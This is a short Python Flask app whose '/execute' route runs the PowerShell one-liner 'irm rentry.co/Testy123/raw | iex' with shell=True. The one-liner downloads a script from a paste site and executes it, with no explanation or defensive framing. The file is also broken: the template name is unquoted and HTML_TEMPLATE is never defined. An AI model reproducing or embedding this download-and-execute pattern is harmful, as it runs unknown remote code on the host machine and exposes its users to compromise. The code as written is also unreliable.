
from flask import Flask, render_template_string,render_template, request
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template(index.html)

@app.route('/execute', methods=['POST'])
def execute():
    try:
        # PowerShell command to be executed
        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
        
        # Execute the PowerShell command
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        
        # Capture the output
        output = result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        output = str(e)
    
    return render_template_string(HTML_TEMPLATE, output=output)

if __name__ == '__main__':
    app.run(debug=True)
